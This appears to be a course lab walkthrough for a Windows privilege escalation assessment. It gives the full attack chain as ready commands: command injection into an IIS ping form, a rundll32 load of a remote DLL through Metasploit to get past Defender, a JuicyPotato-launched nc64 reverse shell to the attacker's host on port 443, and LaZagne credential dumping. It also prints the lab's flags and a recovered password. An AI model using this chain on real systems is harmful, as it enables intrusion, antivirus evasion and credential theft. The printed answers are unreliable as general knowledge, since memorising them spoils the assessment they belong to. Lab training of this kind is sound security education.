# Section 32 — Windows Privilege Escalation Skills Assessment Part I

> **Lab: yes** — Nmap scan, exploit command injection on IIS web app, escalate via SeImpersonatePrivilege + JuicyPotato, extract credentials with LaZagne, find flags.

**Core principle:** Non-domain-joined Windows Server 2016 running an IIS web app vulnerable to command injection. The IIS AppPool account has SeImpersonatePrivilege, exploitable with JuicyPotato to get SYSTEM. Credentials stored on the system are recoverable with LaZagne once running as SYSTEM.

---

## Attack chain

```
Web App (port 80) → Command Injection (& operator)
→ Meterpreter via SMB delivery (rundll32 DLL load)
→ SeImpersonatePrivilege → JuicyPotato with nc64 reverse shell → SYSTEM
→ LaZagne for ldapadmin creds + flag.txt + confidential.txt
```

---

## Reconnaissance

### Nmap scan

```bash
nmap -sS -sV -sC -T4 -Pn -p- TARGET_IP
```
> Host blocks ICMP — must use `-Pn`. Finds port 80 (IIS 10.0 "DEV Connection Tester") and port 3389 (RDP). Product version 10.0.14393 = Windows Server 2016.

### Identify command injection

The web app is a ping utility with an Address field. Inject with `&`:

```
127.0.0.1 & whoami
```
> Returns `iis apppool\defaultapppool`. Confirms OS command injection.

### Get installed KBs

```
127.0.0.1 & wmic qfe get HotFixID
```
> Returns KB3199986 and KB3200970.

### Check privileges

```
127.0.0.1 & whoami /priv
```
> Shows **SeImpersonatePrivilege** enabled — exploitable with JuicyPotato/SweetPotato.

---

## Initial access — Metasploit SMB delivery

PowerShell reverse shells may get blocked by Windows Defender on Server 2016. Use Metasploit's SMB delivery which loads a DLL reflectively in memory, bypassing on-disk AV.

### Setup Metasploit

```bash
msfconsole -q
use exploit/windows/smb/smb_delivery
set SRVHOST KALI_TUN0_IP
set LHOST KALI_TUN0_IP
run
```
> Generates a `rundll32.exe \\KALI_IP\<share>\test.dll,0` command. Make sure no other SMB server (smbserver.py) is running on port 445.

### Inject via web form

Paste into the Address field:

```
127.0.0.1 & rundll32.exe \\KALI_IP\<share>\test.dll,0
```
> Meterpreter session opens in Metasploit.

---

## Privilege escalation — JuicyPotato

### Why JuicyPotato works

The IIS AppPool account has SeImpersonatePrivilege, which allows impersonating tokens from other users (including SYSTEM). JuicyPotato exploits COM servers running as SYSTEM to steal their token.

### Transfer tools

From Meterpreter:

```
shell
```

Then in the cmd shell, use SMB or certutil to transfer tools:

```cmd
copy \\KALI_IP\share\jp.exe C:\Windows\Temp\jp.exe
copy \\KALI_IP\share\nc64.exe C:\Windows\Temp\nc64.exe
copy \\KALI_IP\share\LaZagne.exe C:\Windows\Temp\LaZagne.exe
```
> If using SMB, start `sudo smbserver.py -smb2support share /tmp/` on Kali first. Stop the Metasploit SMB delivery module before starting smbserver.

### Firewall considerations

The target firewall is ON for all profiles. Only common ports like 443 are allowed outbound. Use port 443 for reverse shell callbacks:

```bash
sudo nc -lvnp 443
```

### Execute JuicyPotato

```cmd
C:\Windows\Temp\jp.exe -t * -l 4141 -c {C49E32C6-BC8B-11d2-85D4-00105A1F8304} -p c:\windows\system32\cmd.exe -a "/c C:\Windows\Temp\nc64.exe -e cmd.exe KALI_IP 443"
```
> **CLSID `{C49E32C6-BC8B-11d2-85D4-00105A1F8304}`** is the WMI service — works on Server 2016. The earlier default CLSID `{7A6D9C0A-...}` may authenticate as SYSTEM but fail to actually execute the child process.

> **Port 443** must be used for the callback — other ports are blocked by the Windows firewall. This means you can't have your initial shell AND the SYSTEM callback on the same port simultaneously. Use Meterpreter (port 4444 via SMB delivery) for initial access, then nc on port 443 for SYSTEM shell.

### Verify SYSTEM

```cmd
whoami
```
> Should return `nt authority\system`.

---

## Post-exploitation

### Read flag

```cmd
type C:\Users\Administrator\Desktop\flag.txt
```

### Find and read confidential.txt

```cmd
where /r C:\ confidential.txt
type C:\Users\Administrator\Music\confidential.txt
```

### Extract ldapadmin password

```cmd
C:\Windows\Temp\LaZagne.exe all
```
> Must run as SYSTEM — running as IIS AppPool returns nothing. LaZagne extracts credentials from Windows Credential Manager, browsers, and other stored credential locations.

---

## Lab walkthrough

```
┌──────────────────────────────────────────────────────────────┐
│ VARIABLES — edit these for your instance                     │
├──────────────────────────────────────────────────────────────┤
│ TARGET_IP     = <TARGET_IP>                                  │
│ KALI_TUN0_IP  = (your tun0 IP — check with ip a show tun0)  │
└──────────────────────────────────────────────────────────────┘

STEP 1: RECON
─────────────
1. Nmap scan
   nmap -sS -sV -sC -T4 -Pn -p- <TARGET_IP>
   → Port 80 (IIS "DEV Connection Tester"), Port 3389 (RDP)
   → Server 2016 (Build 14393)

2. Test command injection in web form
   127.0.0.1 & whoami
   → iis apppool\defaultapppool

3. Get KBs (Q1)
   127.0.0.1 & wmic qfe get HotFixID
   → KB3199986 & KB3200970
   → Q1: 3199986&3200970

STEP 2: INITIAL ACCESS — METERPRETER VIA SMB DELIVERY
──────────────────────────────────────────────────────
4. In Metasploit:
   use exploit/windows/smb/smb_delivery
   set SRVHOST <KALI_IP>
   set LHOST <KALI_IP>
   run
   → Generates rundll32.exe command

5. Inject in web form:
   127.0.0.1 & rundll32.exe \\<KALI_IP>\<share>\test.dll,0
   → Meterpreter session opens

   Why SMB delivery? PowerShell reverse shells get caught by Defender.
   SMB delivery loads DLL reflectively in memory — no file on disk.

STEP 3: TRANSFER TOOLS
───────────────────────
6. Drop to shell in Meterpreter
   shell

7. Transfer tools (start smbserver on Kali first, kill MSF smb_delivery)
   copy \\<KALI_IP>\share\jp.exe C:\Windows\Temp\jp.exe
   copy \\<KALI_IP>\share\nc64.exe C:\Windows\Temp\nc64.exe
   copy \\<KALI_IP>\share\LaZagne.exe C:\Windows\Temp\LaZagne.exe

STEP 4: ESCALATE — JUICYPOTATO TO SYSTEM
─────────────────────────────────────────
8. Start nc listener on Kali (port 443 — only allowed outbound port)
   sudo nc -lvnp 443

9. Run JuicyPotato on target
   C:\Windows\Temp\jp.exe -t * -l 4141 -c {C49E32C6-BC8B-11d2-85D4-00105A1F8304} -p c:\windows\system32\cmd.exe -a "/c C:\Windows\Temp\nc64.exe -e cmd.exe <KALI_IP> 443"
   → SYSTEM shell on port 443 listener

   Key: Use CLSID {C49E32C6-BC8B-11d2-85D4-00105A1F8304} (WMI service)
   for Server 2016. Other CLSIDs may auth as SYSTEM but fail to execute.

STEP 5: POST-EXPLOITATION
─────────────────────────
10. Read flag (Q3)
    type C:\Users\Administrator\Desktop\flag.txt
    → Ev3ry_sysadm1ns_n1ghtMare!

11. Find and read confidential.txt (Q4)
    where /r C:\ confidential.txt
    type C:\Users\Administrator\Music\confidential.txt
    → 5e5a7dafa79d923de3340e146318c31a

12. Extract ldapadmin password (Q2)
    C:\Windows\Temp\LaZagne.exe all
    → ldapadmin / car3ful_st0rinG_cr3d$

    LaZagne must run as SYSTEM to find stored credentials.
    Running as IIS AppPool returns nothing.
```

---

## Key takeaways

- **SMB delivery bypasses Defender.** PowerShell reverse shells get caught on Server 2016. Use Metasploit's `smb_delivery` module which loads a DLL reflectively in memory via `rundll32.exe`.
- **SeImpersonatePrivilege on IIS = JuicyPotato to SYSTEM.** Always check `whoami /priv` on IIS/SQL service accounts.
- **CLSID matters.** `{C49E32C6-BC8B-11d2-85D4-00105A1F8304}` (WMI) works on Server 2016. The default BITS CLSID and others may report success but fail to execute child processes.
- **Firewall blocks most outbound ports.** Test which ports work (443 is commonly allowed) before wasting time on failed callbacks.
- **LaZagne requires SYSTEM privileges** to extract most stored credentials. Running as a low-privilege user returns nothing useful.
- **confidential.txt is in `C:\Users\Administrator\Music\`** — non-obvious location, use `where /r C:\ filename` to find files recursively.
